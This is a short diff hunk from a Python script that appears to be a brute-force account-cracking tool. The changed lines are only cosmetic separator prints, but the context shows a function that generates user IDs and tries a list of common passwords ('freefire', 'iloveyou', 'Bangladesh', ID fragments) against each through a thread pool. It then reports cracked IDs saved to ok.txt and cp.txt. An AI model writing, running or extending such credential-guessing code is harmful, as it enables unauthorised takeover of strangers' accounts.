@@ -224,10 +224,10 @@ def BRA():
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
 			yaari.submit(b,uid,pwx,tl)
-	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+	print('\033[1;37m━━━━━━━━━━━')
 	print(' [💉] Crack process has been completed')
 	print(' [💉] Ids saved in ok.txt,cp.txt')
-	print(50*'_')
+	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 	exit()
 
 def b(uid,pwx,tl):
